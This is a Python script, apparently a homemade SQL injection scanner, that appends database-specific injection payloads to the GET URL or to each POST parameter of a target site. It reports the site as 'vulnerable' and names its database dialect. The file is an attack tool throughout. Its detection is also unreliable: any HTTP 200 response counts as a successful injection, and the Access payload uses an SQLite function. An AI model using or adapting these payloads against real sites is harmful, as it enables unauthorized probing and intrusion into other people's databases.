import mechanize
import requests
from faker import Faker
import argparse

#argumets defined for script to work as it is designed
parser = argparse.ArgumentParser() #Initializing argument parser to accept atguments
#Defining arguments
parser.add_argument("--url", help="Url to send the request.", type=str, required=True)
parser.add_argument("--method", help="Method for sending the request.", default="GET", type=str)
parser.add_argument("--data", help="Data in case a post request. Ex. name=value,name2=value2", type=str,)
args = parser.parse_args() #Parsing arguments
method = str.upper(args.method) #get the method provided and make it upper case

#Payloads to find the dbms
#Each one works only on specified dialect
find_dbms_payloads = {
    "mysql": "' or connection_id() = connection_id(); --",
    "postgresql": "' or pg_client_encoding() = pg_client_encoding(); --",
    "mssql": "' or @@CONNECTIONS = @@CONNECTIONS; --",
    "oracle": "' or RAWTOHEX('AB')=RAWTOHEX('AB'); --",
    "sqlite": "' or sqlite_version() = sqlite_version(); --",
    "msacess": "' or last_insert_rowid()>1; --"
}

# POST request
if(method == "POST"):
    #Check for data params
    if(not args.data):
        print("When POST method is specified you must pass the data argument")
    else: 
        dataArgs = args.data.split(",")
        postParams = {}
        for arg in dataArgs:
            arg = arg.split("=");
            postParams[arg[0]] = arg[1]
        requestList = {}
        for param in postParams:
            for payload in find_dbms_payloads:
                data = postParams.copy()
                data[param] = data[param] + find_dbms_payloads[payload]
                resp = requests.post(args.url, data)
                if(resp.status_code == 200):
                    print("Argumet " + param + " seems to be injectable.")
                    requestList[payload] = resp

        if(len(requestList) > 0):
            print("Target is vulnerable.")
            for response in requestList:
                resp = requestList[response]
                print("The dialect of the target is " + response)
        else:
            print("Target seems secure.")
#GET request
elif(method == "GET"):
    requestList = {}
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
    for payload in find_dbms_payloads:
        url = args.url + find_dbms_payloads[payload]
        resp = requests.get(url)
        if(resp.status_code == 200):
            print("Url seems injectable.")
            requestList[payload] = resp
    if(len(requestList) > 0):
        print("Target is vulnerable.")
        for response in requestList:
            resp = requestList[response]
            print("The dialect of the target is " + response)
    else:
        print("Target seems secure.")
else:
    print("Method got incorrect value")